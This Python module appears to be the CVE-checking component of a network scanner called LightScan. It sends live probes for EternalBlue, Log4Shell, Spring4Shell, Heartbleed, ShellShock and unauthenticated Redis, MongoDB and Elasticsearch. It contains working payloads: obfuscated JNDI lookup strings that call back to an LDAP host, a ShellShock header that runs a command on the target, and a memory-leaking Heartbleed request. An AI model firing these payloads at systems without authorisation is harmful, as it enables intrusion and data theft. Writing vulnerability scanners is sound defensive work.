"""
LightScan v2.0 PHANTOM — CVE Checker
Developer: Light

EternalBlue (MS17-010) · Log4Shell (CVE-2021-44228) · Spring4Shell (CVE-2022-22965)
Heartbleed (CVE-2014-0160) · ShellShock (CVE-2014-6271) · BlueKeep (CVE-2019-0708)
Redis Unauth · MongoDB Unauth · Elasticsearch Unauth · Jupyter NoAuth
"""
from __future__ import annotations
import asyncio, struct, socket, urllib.request, urllib.error
from lightscan.core.engine import ScanResult, Severity


# ─── EternalBlue MS17-010 ────────────────────────────────────────────────────
_SMB_NEG = bytes([
    0x00,0x00,0x00,0x54,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,
    0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0xFE,
    0x00,0x00,0x00,0x00,0x00,0x31,0x00,0x02,0x4C,0x41,0x4E,0x4D,0x41,0x4E,
    0x31,0x2E,0x30,0x00,0x02,0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,
    0x00,0x02,0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,
    0x30,0x00,0x02,0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00,
])
_SMB_SESS = bytes([
    0x00,0x00,0x00,0x63,0xFF,0x53,0x4D,0x42,0x73,0x00,0x00,0x00,0x00,0x18,
    0x07,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0xFE,
    0x00,0x00,0x40,0x00,0x0C,0xFF,0x00,0x00,0x00,0xFF,0xFF,0x02,0x00,0x01,
    0x00,0x00,0x00,0x00,0x00,0x57,0x00,0x57,0x00,0x4A,0x00,0x00,0x80,
])

async def check_eternalblue(host, port=445, timeout=5.0):
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        w.write(_SMB_NEG); await w.drain()
        resp = await asyncio.wait_for(r.read(1024), timeout=timeout)
        if len(resp) < 36: w.close(); return ScanResult("cve-ms17-010",host,port,"not_vuln",Severity.INFO,"SMB negotiate failed")
        w.write(_SMB_SESS); await w.drain()
        sess = await asyncio.wait_for(r.read(1024), timeout=timeout)
        w.close()
        if len(sess) >= 36:
            mux_id = struct.unpack("<H", sess[30:32])[0]
            if mux_id == 65:
                return ScanResult("cve-ms17-010",host,port,"VULNERABLE+BACKDOOR",Severity.CRITICAL,
                    "EternalBlue MS17-010 + DOUBLEPULSAR backdoor ACTIVE!",{"cve":"CVE-2017-0144","doublepulsar":True})
            if sess[9] == 0x00:
                return ScanResult("cve-ms17-010",host,port,"VULNERABLE",Severity.CRITICAL,
                    "MS17-010 EternalBlue: likely vulnerable (unauth SMB session)",{"cve":"CVE-2017-0144"})
        return ScanResult("cve-ms17-010",host,port,"not_vuln",Severity.INFO,"EternalBlue: not vulnerable")
    except asyncio.TimeoutError:
        return ScanResult("cve-ms17-010",host,port,"timeout",Severity.INFO,"timeout")
    except Exception as e:
        return ScanResult("cve-ms17-010",host,port,"error",Severity.INFO,str(e))


# ─── Log4Shell CVE-2021-44228 ────────────────────────────────────────────────
LOG4SHELL_HEADERS = ["User-Agent","X-Forwarded-For","X-Api-Version","Referer","Accept-Language","X-Real-IP","Cookie"]
LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://{{cb}}/a}",
    "${${lower:j}ndi:${lower:l}dap://{{cb}}/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://{{cb}}/a}",
    "${${upper:j}ndi:${upper:l}dap://{{cb}}/a}",
    "${j${::-n}di:ldap://{{cb}}/a}",
]

async def check_log4shell(host, port=80, path="/", timeout=8.0, callback="127.0.0.1:1389"):
    scheme = "https" if port in (443,8443) else "http"
    url    = f"{scheme}://{host}:{port}{path}"
    loop   = asyncio.get_event_loop()

    for header in LOG4SHELL_HEADERS[:4]:
        payload = LOG4SHELL_PAYLOADS[0].replace("{{cb}}", callback)
        try:
            req = urllib.request.Request(url, headers={
                header: payload, "User-Agent": "LightScan/2.0"
            })
            def _send():
                try:
                    with urllib.request.urlopen(req, timeout=timeout) as r:
                        return r.status
                except urllib.error.HTTPError as e: return e.code
                except Exception: return 0
            status = await loop.run_in_executor(None, _send)
            if status in (200,302,400,401,403,404,500):
                return ScanResult("cve-log4shell",host,port,"probe_sent",Severity.HIGH,
                    f"Log4Shell payload via {header} → HTTP {status}. Verify callback: {callback}",
                    {"cve":"CVE-2021-44228","header":header,"payload":payload,"callback":callback})
        except Exception: continue
    return ScanResult("cve-log4shell",host,port,"no_response",Severity.INFO,"No HTTP response to probe")


# ─── Spring4Shell CVE-2022-22965 ─────────────────────────────────────────────
S4S_PAYLOAD = ("class.module.classLoader.resources.context.parent.pipeline"
               ".first.pattern=%25%7Bprefix%7Di java.io.OutputStream%20os")

async def check_spring4shell(host, port=8080, timeout=8.0):
    scheme = "https" if port in (443,8443) else "http"
    loop   = asyncio.get_event_loop()
    for path in ("/","/?class.module.classLoader","/login","/api/users"):
        url = f"{scheme}://{host}:{port}{path}"
        try:
            req = urllib.request.Request(url,
                data=S4S_PAYLOAD.encode(),
                headers={"Content-Type":"application/x-www-form-urlencoded",
                         "User-Agent":"LightScan/2.0","suffix":"%>//"},
                method="POST")
            def _send(u=url):
                try:
                    with urllib.request.urlopen(req,timeout=timeout) as r: return r.status
                except urllib.error.HTTPError as e: return e.code
                except Exception: return 0
            status = await loop.run_in_executor(None, _send)
            if status == 400:
                return ScanResult("cve-spring4shell",host,port,"possibly_vulnerable",Severity.HIGH,
                    f"Spring4Shell probe → 400 on {path}. May indicate vulnerable Spring Framework.",
                    {"cve":"CVE-2022-22965","path":path})
        except Exception: continue
    return ScanResult("cve-spring4shell",host,port,"not_detected",Severity.INFO,"Spring4Shell: no indicator")


# ─── Heartbleed CVE-2014-0160 ────────────────────────────────────────────────
_CLIENT_HELLO = (
    b"\x16\x03\x01\x00\x70\x01\x00\x00\x6c\x03\x03" + b"\x00"*32 +
    b"\x00\x00\x04\x00\x2f\x00\x35\x01\x00\x00\x3f" +
    b"\x00\x0f\x00\x01\x01"
)
_HEARTBEAT = b"\x18\x03\x02\x00\x03\x01\xfa\x00"

async def check_heartbleed(host, port=443, timeout=8.0):
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        w.write(_CLIENT_HELLO); await w.drain()
        hello_resp = await asyncio.wait_for(r.read(4096), timeout=timeout)
        if len(hello_resp) < 5: w.close(); return ScanResult("cve-heartbleed",host,port,"not_tls",Severity.INFO,"Not TLS")
        w.write(_HEARTBEAT); await w.drain()
        try: resp = await asyncio.wait_for(r.read(65535), timeout=3.0)
        except asyncio.TimeoutError: resp=b""
        w.close()
        if len(resp) > 3 and resp[0] == 0x18:
            return ScanResult("cve-heartbleed",host,port,"VULNERABLE",Severity.CRITICAL,
                f"Heartbleed: server LEAKED {len(resp)} bytes of memory!",
                {"cve":"CVE-2014-0160","leaked_bytes":len(resp)})
        return ScanResult("cve-heartbleed",host,port,"not_vuln",Severity.INFO,"Heartbleed: not vulnerable")
    except Exception as e:
        return ScanResult("cve-heartbleed",host,port,"error",Severity.INFO,str(e))


# ─── ShellShock CVE-2014-6271 ────────────────────────────────────────────────
SHELLSHOCK = "() { :; }; echo; echo shellshock_$(id)"

async def check_shellshock(host, port=80, timeout=8.0):
    scheme = "https" if port in (443,8443) else "http"
    paths  = ["/cgi-bin/test.cgi","/cgi-bin/status","/cgi-bin/env.cgi",
              "/cgi-sys/entropybanner.cgi","/cgi-bin/bash","/cgi-bin/php"]
    loop   = asyncio.get_event_loop()
    for path in paths:
        url = f"{scheme}://{host}:{port}{path}"
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": SHELLSHOCK, "Referer": SHELLSHOCK, "Cookie": SHELLSHOCK
            })
            def _send():
                try:
                    with urllib.request.urlopen(req,timeout=timeout) as r:
                        return r.read(512).decode("utf-8","replace")
                except Exception: return ""
            body = await loop.run_in_executor(None, _send)
            if "uid=" in body and "shellshock_" in body:
                return ScanResult("cve-shellshock",host,port,"VULNERABLE",Severity.CRITICAL,
                    f"ShellShock RCE on {path}: {body[:80]}",{"cve":"CVE-2014-6271","output":body})
        except Exception: continue
    return ScanResult("cve-shellshock",host,port,"not_detected",Severity.INFO,"ShellShock: no CGI found")


# ─── Redis Unauth ─────────────────────────────────────────────────────────────
async def check_redis_unauth(host, port=6379, timeout=5.0):
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        w.write(b"*1\r\n$4\r\nINFO\r\n"); await w.drain()
        resp = await asyncio.wait_for(r.read(1024), timeout=timeout)
        w.close()
        if b"redis_version" in resp:
            ver = ""
            for line in resp.decode("utf-8","replace").split("\n"):
                if "redis_version" in line: ver=line.strip(); break
            return ScanResult("redis-unauth",host,port,"VULNERABLE",Severity.CRITICAL,
                f"Redis UNAUTHENTICATED: {ver}",{"service":"Redis","auth":False})
        return ScanResult("redis-unauth",host,port,"not_vuln",Severity.INFO,"Redis: auth required or not Redis")
    except Exception as e:
        return ScanResult("redis-unauth",host,port,"error",Severity.INFO,str(e))


# ─── MongoDB Unauth ───────────────────────────────────────────────────────────
async def check_mongo_unauth(host, port=27017, timeout=5.0):
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        # isMaster command
        payload = bytes([
            0x3a,0x00,0x00,0x00,0xd4,0x07,0x00,0x00,0x00,0x00,0x00,0x00,
            0xd4,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x61,0x64,0x6d,0x69,
            0x6e,0x2e,0x24,0x63,0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0xff,
            0xff,0xff,0xff,0x13,0x00,0x00,0x00,0x10,0x69,0x73,0x4d,0x61,
            0x73,0x74,0x65,0x72,0x00,0x01,0x00,0x00,0x00,0x00
        ])
        w.write(payload); await w.drain()
        resp = await asyncio.wait_for(r.read(2048), timeout=timeout)
        w.close()
        if b"ismaster" in resp.lower() or b"maxBsonObjectSize" in resp:
            return ScanResult("mongo-unauth",host,port,"VULNERABLE",Severity.CRITICAL,
                "MongoDB UNAUTHENTICATED: ismaster command succeeded",{"service":"MongoDB","auth":False})
        return ScanResult("mongo-unauth",host,port,"not_vuln",Severity.INFO,"MongoDB: auth required")
    except Exception as e:
        return ScanResult("mongo-unauth",host,port,"error",Severity.INFO,str(e))


# ─── Elasticsearch Unauth ─────────────────────────────────────────────────────
async def check_elastic_unauth(host, port=9200, timeout=5.0):
    loop = asyncio.get_event_loop()
    def _try():
        try:
            req = urllib.request.Request(f"http://{host}:{port}/", headers={"User-Agent":"LightScan/2.0"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read(512).decode("utf-8","replace")
                if "cluster_name" in body or "elasticsearch" in body.lower():
                    return True, body[:100]
                return False, body[:50]
        except urllib.error.HTTPError as e:
            return False, f"HTTP {e.code}"
        except Exception as e:
            return False, str(e)
    ok, detail = await loop.run_in_executor(None, _try)
    if ok:
        return ScanResult("elastic-unauth",host,port,"VULNERABLE",Severity.CRITICAL,
            f"Elasticsearch UNAUTHENTICATED: {detail}",{"service":"Elasticsearch","auth":False})
    return ScanResult("elastic-unauth",host,port,"not_vuln",Severity.INFO,"Elasticsearch: auth required")


# ─── CVE Checker Dispatcher ───────────────────────────────────────────────────
class CVEChecker:
    CHECKS = {
        "eternalblue":    (check_eternalblue,    445),
        "log4shell":      (check_log4shell,       80),
        "spring4shell":   (check_spring4shell,    8080),
        "heartbleed":     (check_heartbleed,      443),
        "shellshock":     (check_shellshock,      80),
        "redis-unauth":   (check_redis_unauth,    6379),
        "mongo-unauth":   (check_mongo_unauth,    27017),
        "elastic-unauth": (check_elastic_unauth,  9200),
    }

    def __init__(self, timeout=8.0, callback="127.0.0.1:1389"):
        self.timeout=timeout; self.callback=callback

    async def check_all(self, host, ports=None, checks=None):
        checks = checks or list(self.CHECKS.keys())
        tasks  = []
        for name in checks:
            if name not in self.CHECKS: continue
            fn, default_port = self.CHECKS[name]
            port = default_port
            if ports:
                for p in ports:
                    if p == default_port: port=p; break
            if name == "log4shell":
                tasks.append(fn(host, port, timeout=self.timeout, callback=self.callback))
            else:
                tasks.append(fn(host, port, timeout=self.timeout))
        return [r for r in await asyncio.gather(*tasks) if isinstance(r, ScanResult)]
